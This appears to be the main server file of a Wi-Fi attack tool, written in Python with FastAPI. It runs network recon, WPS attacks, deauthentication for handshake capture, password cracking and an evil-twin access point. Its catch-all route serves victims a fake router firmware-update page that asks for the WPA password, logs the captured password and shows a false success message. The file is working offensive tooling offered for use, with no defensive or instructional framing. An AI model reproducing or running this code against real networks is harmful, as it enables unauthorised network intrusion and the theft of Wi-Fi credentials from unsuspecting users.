from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Form
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import asyncio
import os
import json
import subprocess
import re

from core.recon import ReconEngine, TargetScanner
from core.attacks.wps_attack import WPSAttackEngine
from core.attacks.handshake import HandshakeCaptureEngine
from core.attacks.cracker import CrackerEngine
from core.attacks.evil_twin import EvilTwinEngine

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

# Global States
recon_engine = None
target_scanner = None
wps_engine = None
handshake_engine = None
cracker_engine = None
evil_twin_engine = None
networks_db = {}
target_info = {}
selected_interface = "wlan0"

def get_interfaces():
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
        interfaces = re.findall(r"Interface\s+(\w+)", result.stdout)
        return interfaces if interfaces else ["wlan0"]
    except Exception:
        return ["wlan0"]

class ConnectionManager:
    def __init__(self):
        self.active_connections = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()
loop = None

@app.on_event("startup")
async def startup_event():
    global loop
    loop = asyncio.get_running_loop()

def on_log_callback(message):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "log", "message": message}), loop)

def on_update_callback(db):
    networks_db.update(db)
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "targets", "data": list(networks_db.values())}), loop)

def on_station_callback(stations):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "stations", "data": stations}), loop)

def on_wps_success_callback(key_type, value):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "wps_success", "key_type": key_type, "value": value}), loop)

def on_hs_success_callback(key_type, value):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "hs_success", "key_type": key_type, "value": value}), loop)

def on_crack_success_callback(key_type, value):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "crack_success", "key_type": key_type, "value": value}), loop)

def on_et_success_callback(key_type, value):
    asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "et_success", "key_type": key_type, "value": value}), loop)

@app.get("/api/interfaces")
async def api_interfaces():
    return {"interfaces": get_interfaces(), "current": selected_interface}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    global recon_engine, target_scanner, wps_engine, handshake_engine, cracker_engine, evil_twin_engine, selected_interface
    await manager.connect(websocket)
    
    try:
        while True:
            data = await websocket.receive_text()
            msg = json.loads(data)
            
            if msg["action"] == "set_interface":
                iface = msg["interface"]
                if iface == selected_interface: continue
                
                if recon_engine: recon_engine.stop(); recon_engine = None
                if target_scanner: target_scanner.stop(); target_scanner = None
                if wps_engine: wps_engine.stop(); wps_engine = None
                if handshake_engine: handshake_engine.stop(); handshake_engine = None
                if cracker_engine: cracker_engine.stop(); cracker_engine = None
                if evil_twin_engine: evil_twin_engine.stop(); evil_twin_engine = None
                
                selected_interface = iface
                networks_db.clear()
                target_info.clear()
                
                asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "clear_ui"}), loop)
                on_log_callback(f"[*] Interface switched to {selected_interface}")
                
            elif msg["action"] == "start_recon":
                if not recon_engine:
                    recon_engine = ReconEngine(selected_interface, on_log_callback, on_update_callback)
                    recon_engine.start()
                    
            elif msg["action"] == "stop_recon":
                if recon_engine:
                    recon_engine.stop()
                    recon_engine = None
                    
            elif msg["action"] == "select_target":
                bssid = msg["bssid"]
                if bssid in networks_db:
                    target = networks_db[bssid]
                    target_info.update(target)
                    
                    if wps_engine: wps_engine.stop(); wps_engine = None
                    if handshake_engine: handshake_engine.stop(); handshake_engine = None
                    if cracker_engine: cracker_engine.stop(); cracker_engine = None
                    if evil_twin_engine: evil_twin_engine.stop(); evil_twin_engine = None
                    if recon_engine: recon_engine.stop(); recon_engine = None
                    if target_scanner: target_scanner.stop()
                        
                    target_scanner = TargetScanner(
                        selected_interface, target["bssid"], target["channel"], target["essid"],
                        on_log_callback, on_station_callback
                    )
                    target_scanner.start()
                    
            elif msg["action"] == "back_to_scan":
                if wps_engine: wps_engine.stop(); wps_engine = None
                if handshake_engine: handshake_engine.stop(); handshake_engine = None
                if cracker_engine: cracker_engine.stop(); cracker_engine = None
                if evil_twin_engine: evil_twin_engine.stop(); evil_twin_engine = None
                if target_scanner: target_scanner.stop(); target_scanner = None
                on_log_callback("[*] Returning to general scan...")
                if not recon_engine:
                    recon_engine = ReconEngine(selected_interface, on_log_callback, on_update_callback)
                    recon_engine.start()

            elif msg["action"] == "start_wps":
                mode = msg["mode"]
                if wps_engine: continue
                if handshake_engine: handshake_engine.stop(); handshake_engine = None
                if evil_twin_engine: evil_twin_engine.stop(); evil_twin_engine = None
                if target_scanner: target_scanner.stop(); target_scanner = None
                on_log_callback("[*] Target scanner stopped for WPS attack.")
                wps_engine = WPSAttackEngine(
                    selected_interface, target_info["bssid"], target_info["channel"],
                    on_log_callback, on_wps_success_callback, mode=mode
                )
                wps_engine.start()
                
            elif msg["action"] == "stop_wps":
                if wps_engine:
                    wps_engine.stop()
                    wps_engine = None

            elif msg["action"] == "start_deauth":
                client_mac = msg["client_mac"]
                if handshake_engine: continue
                if wps_engine: wps_engine.stop(); wps_engine = None
                if evil_twin_engine: evil_twin_engine.stop(); evil_twin_engine = None
                if target_scanner: target_scanner.stop(); target_scanner = None
                on_log_callback("[*] Target scanner stopped for Handshake capture.")
                
                handshake_engine = HandshakeCaptureEngine(
                    selected_interface, target_info["bssid"], target_info["channel"], target_info["essid"],
                    client_mac, on_log_callback, on_hs_success_callback
                )
                handshake_engine.start()

            elif msg["action"] == "stop_handshake":
                if handshake_engine:
                    handshake_engine.stop()
                    handshake_engine = None

            elif msg["action"] == "start_crack":
                wordlist = msg["wordlist"]
                cap_file = msg["cap_file"]
                if cracker_engine: continue
                cracker_engine = CrackerEngine(
                    cap_file, wordlist, on_log_callback, on_crack_success_callback
                )
                cracker_engine.start()

            elif msg["action"] == "stop_crack":
                if cracker_engine:
                    cracker_engine.stop()
                    cracker_engine = None

            elif msg["action"] == "start_evil_twin":
                if evil_twin_engine: continue
                if wps_engine: wps_engine.stop(); wps_engine = None
                if handshake_engine: handshake_engine.stop(); handshake_engine = None
                if target_scanner: target_scanner.stop(); target_scanner = None
                if recon_engine: recon_engine.stop(); recon_engine = None
                
                evil_twin_engine = EvilTwinEngine(
                    selected_interface, target_info["bssid"], target_info["essid"], target_info["channel"],
                    on_log_callback, on_et_success_callback
                )
                evil_twin_engine.start()

            elif msg["action"] == "stop_evil_twin":
                if evil_twin_engine:
                    evil_twin_engine.stop()
                    evil_twin_engine = None

    except WebSocketDisconnect:
        manager.disconnect(websocket)

# ==========================================
# Smart Router: Separates Attacker UI from Victim Phishing
# ==========================================
@app.api_route("/{path:path}", methods=["GET", "POST"])
async def smart_router(request: Request, path: str):
    client_ip = request.client.host
    
    # 1. If the request is from the attacker (localhost or the gateway IP 10.0.0.1)
    if client_ip in ["127.0.0.1", "::1", "10.0.0.1"] or path.startswith("ws") or path.startswith("api"):
        if request.method == "GET":
            # Serve the main VEKT UI
            with open(os.path.join("static", "index.html"), "r") as f:
                return HTMLResponse(content=f.read())
        return JSONResponse({"error": "Method not allowed for UI"}, status_code=405)

    # 2. If the request is from a victim (connected to the Evil Twin AP)
    if request.method == "GET":
        # Serve the Phishing Page
        html_content = """
        <html>
            <head><title>Router Login</title></head>
            <body style='font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f0f0f0;'>
                <div style='background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto;'>
                    <h2 style='color: #333;'>Router Firmware Update Required</h2>
                    <p style='color: #666; font-size: 14px;'>A critical security update is available. Please enter your WPA password to apply the update and restore internet access.</p>
                    <form action="/" method="post">
                        <input type="password" name="password" placeholder="Enter WPA Password" required style="padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 15px;">
                        <br>
                        <button type="submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Apply Update</button>
                    </form>
                </div>
            </body>
        </html>
        """
        return HTMLResponse(content=html_content)
        
    elif request.method == "POST":
        # Handle Phishing Form Submission
        form = await request.form()
        password = form.get("password")
        global evil_twin_engine
        if evil_twin_engine:
            on_log_callback(f"[+] PASSWORD CAPTURED VIA PORTAL: {password}")
            on_et_success_callback("password", password)
            evil_twin_engine.stop()
            evil_twin_engine = None
            
        success_html = """
        <html>
            <head><title>Update Successful</title></head>
            <body style='font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f0f0f0;'>
                <div style='background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto;'>
                    <h2 style='color: green;'>Update Successful!</h2>
                    <p style='color: #666; font-size: 14px;'>Your router is being updated. You will be disconnected shortly. Please reconnect in a few minutes.</p>
                </div>
            </body>
        </html>
        """
        return HTMLResponse(content=success_html)

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=False)
